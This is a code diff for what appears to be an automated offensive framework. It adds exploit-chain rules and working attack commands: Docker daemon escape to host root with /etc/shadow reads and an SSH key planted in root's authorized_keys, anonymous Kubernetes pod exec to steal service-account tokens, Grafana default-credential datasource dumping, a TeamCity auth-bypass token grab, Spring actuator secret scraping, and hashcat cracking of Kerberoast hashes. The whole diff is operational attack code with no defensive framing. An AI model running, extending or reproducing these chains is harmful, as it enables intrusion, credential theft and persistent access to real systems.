@@ -18153,6 +18153,17 @@ PRIORITIES (strict order): exploit_confirmed_vuln > dump_creds_post_exploit > ch
         {"trigger": r"redis.*no.?auth|redis.*unauth",           "actions": ["redis_chain_rce"]},
         {"trigger": r"valid.*cred|cred.*found|hydra.*login|login.*success", "actions": ["cred_stuff_all"]},
         {"trigger": r"rce|remote.*code.*exec|command.*inject|webshell", "actions": ["rce_post_exploit"]},
+        # 2023-2024 chain rules
+        {"trigger": r"DOCKER_DAEMON_EXPOSED|docker.*daemon.*2375",    "actions": ["docker_escape"]},
+        {"trigger": r"KUBERNETES_API_ANONYMOUS|k8s.*anon",            "actions": ["k8s_exec"]},
+        {"trigger": r"GRAFANA_DEFAULT_CREDS_VALID|grafana.*admin",    "actions": ["grafana_ds_exploit"]},
+        {"trigger": r"TEAMCITY_AUTH_BYPASS",                          "actions": ["teamcity_rce"]},
+        {"trigger": r"METABASE_SETUP_TOKEN",                          "actions": ["metabase_jdbc_rce"]},
+        {"trigger": r"ACTIVEMQ_DEFAULT_CREDS|activemq.*admin",       "actions": ["activemq_rce"]},
+        {"trigger": r"spring.*actuator|actuator.*env.*password",      "actions": ["actuator_cred_extract"]},
+        {"trigger": r"\.env.*expuest|APP_KEY=|DB_PASSWORD=",         "actions": ["env_cred_chain"]},
+        {"trigger": r"secretsdump|NTLM.*hashes|hashdump",            "actions": ["hash_crack_chain"]},
+        {"trigger": r"kerberoast|krb5tgs|krb5asrep",                 "actions": ["kerberoast_crack"]},
     ]
 
     def _recent_cve_scanner(self, target, open_ports, accumulated_output):
@@ -18989,6 +19000,99 @@ PRIORITIES (strict order): exploit_confirmed_vuln > dump_creds_post_exploit > ch
                                 target, timeout=10)
                             if rce_out.strip():
                                 accumulated_output.append(f"=== CHAIN RCE {cmd} ===\n{rce_out[:300]}")
+
+                elif action == "docker_escape":
+                    self._log(f"[C1-CHAIN] Docker daemon exposed → escaping to host root")
+                    docker_esc, _ = self._run_cmd("chain-docker-escape",
+                        f"docker -H tcp://{target}:2375 run --rm -v /:/mnt alpine sh -c "
+                        f"'echo DOCKER_ESCAPE_CONFIRMED; id; cat /mnt/etc/shadow 2>/dev/null | head -5; "
+                        f"cat /mnt/root/root.txt 2>/dev/null; cat /mnt/home/*/user.txt 2>/dev/null | head -3; "
+                        f"# Add SSH key for persistence\n"
+                        f"mkdir -p /mnt/root/.ssh && echo $(cat /root/.ssh/id_rsa.pub 2>/dev/null || echo ssh-rsa AAAA...) >> /mnt/root/.ssh/authorized_keys 2>/dev/null' 2>/dev/null | head -20",
+                        target, timeout=30)
+                    self._capture_evidence(docker_esc, target, "chain-docker-escape", "Docker escape")
+                    if docker_esc.strip():
+                        accumulated_output.append(f"=== CHAIN Docker Escape ===\n{docker_esc[:600]}")
+
+                elif action == "k8s_exec":
+                    self._log(f"[C1-CHAIN] K8s API anon → enumerating and exec into pods")
+                    k8s_esc, _ = self._run_cmd("chain-k8s-exec",
+                        f"PODS=$(kubectl --server=https://{target}:6443 --insecure-skip-tls-verify "
+                        f"get pods --all-namespaces -o name 2>/dev/null | head -5); "
+                        f"for pod in $PODS; do "
+                        f"kubectl --server=https://{target}:6443 --insecure-skip-tls-verify "
+                        f"exec $pod -- id 2>/dev/null && "
+                        f"kubectl --server=https://{target}:6443 --insecure-skip-tls-verify "
+                        f"exec $pod -- cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -1; "
+                        f"done",
+                        target, timeout=30)
+                    if k8s_esc.strip():
+                        accumulated_output.append(f"=== CHAIN K8s Exec ===\n{k8s_esc[:400]}")
+
+                elif action == "grafana_ds_exploit":
+                    self._log(f"[C1-CHAIN] Grafana creds valid → dumping datasources for DB creds")
+                    gds_out, _ = self._run_cmd("chain-grafana-ds",
+                        f"curl -s --max-time 10 -u admin:admin 'http://{target}:3000/api/datasources' 2>/dev/null | "
+                        f"python3 -c 'import sys,json; "
+                        f"[print(d.get(\"type\",\"\"),d.get(\"url\",\"\"),d.get(\"basicAuthUser\",\"\")) "
+                        f"for d in json.load(sys.stdin)]' 2>/dev/null; "
+                        f"curl -s --max-time 10 -u admin:admin 'http://{target}:3000/api/datasources/1/resources/databases' 2>/dev/null | head -10",
+                        target, timeout=20)
+                    if gds_out.strip():
+                        accumulated_output.append(f"=== CHAIN Grafana Datasources ===\n{gds_out[:400]}")
+
+                elif action == "teamcity_rce":
+                    self._log(f"[C1-CHAIN] TeamCity bypass → getting admin token and executing build")
+                    tc_rce, _ = self._run_cmd("chain-teamcity-rce",
+                        f"TOKEN=$(curl -s --max-time 10 -X POST "
+                        f"'http://{target}:8111/app/rest/users/id:1/tokens/RPC2' 2>/dev/null | "
+                        f"python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get(\"value\",\"\"))' 2>/dev/null); "
+                        f"[ -n \"$TOKEN\" ] && curl -s -H \"Authorization: Bearer $TOKEN\" "
+                        f"'http://{target}:8111/app/rest/builds?locator=buildType:anyBuildType,running:true' 2>/dev/null | head -10",
+                        target, timeout=25)
+                    if tc_rce.strip():
+                        accumulated_output.append(f"=== CHAIN TeamCity RCE ===\n{tc_rce[:400]}")
+
+                elif action == "actuator_cred_extract":
+                    self._log(f"[C1-CHAIN] Spring actuator → extracting credentials from env")
+                    act_out, _ = self._run_cmd("chain-actuator-creds",
+                        f"for ep in actuator/env actuator/configprops; do "
+                        f"curl -sk --max-time 8 'http://{target}/$ep' 2>/dev/null | "
+                        f"python3 -c 'import sys,json; "
+                        f"text=sys.stdin.read(); "
+                        f"import re; "
+                        f"creds=re.findall(r'''(?:password|passwd|secret|key|token)[\"'\\s:=]+([^\"'\\s<>{}]{4,40})''', text, re.IGNORECASE); "
+                        f"[print(\"ACTUATOR_CRED:\", c) for c in creds[:5] if c]' 2>/dev/null; done",
+                        target, timeout=20)
+                    if "ACTUATOR_CRED" in act_out:
+                        accumulated_output.append(f"=== CHAIN Actuator Creds ===\n{act_out[:400]}")
+                        creds_from_actuator = re.findall(r'ACTUATOR_CRED:\s*(\S+)', act_out)
+                        if creds_from_actuator:
+                            self._save_findings([{
+                                "title": f"Spring Boot Actuator — Credenciales Extraídas @ {target}",
+                                "severity": "critical",
+                                "description": f"Credenciales obtenidas del actuator: {', '.join(creds_from_actuator[:3])}",
+                                "cve": "",
+                            }], target)
+
+                elif action == "hash_crack_chain":
+                    self._log(f"[C1-CHAIN] Hashes found → auto-cracking and credential stuffing")
+                    self._auto_crack_hashes(combined, target, accumulated_output)
+
+                elif action == "kerberoast_crack":
+                    self._log(f"[C1-CHAIN] Kerberos hashes → hashcat cracking")
+                    krb_hashes = re.findall(r'(\$krb5(?:tgs|asrep)\$[^\s]{30,})', combined)
+                    if krb_hashes:
+                        hash_file = f"/tmp/krb_hashes_{target.replace('.','_')}.txt"
+                        with open(hash_file, "w") as hf:
+                            hf.write("\n".join(krb_hashes[:5]))
+                        mode = "13100" if "tgs" in krb_hashes[0] else "18200"
+                        crack_out, _ = self._run_cmd("chain-kerb-crack",
+                            f"hashcat -m {mode} {hash_file} /usr/share/wordlists/rockyou.txt "
+                            f"--force -q 2>/dev/null | head -5",
+                            target, timeout=120)
+                        if crack_out.strip():
+                            accumulated_output.append(f"=== CHAIN Kerberoast Crack ===\n{crack_out[:300]}")
 
     def _vuln_chain_engine_use_creds(self, target, open_ports, cred_pairs, accumulated_output):
         """Helper: try (user, pass) pairs on all open services."""
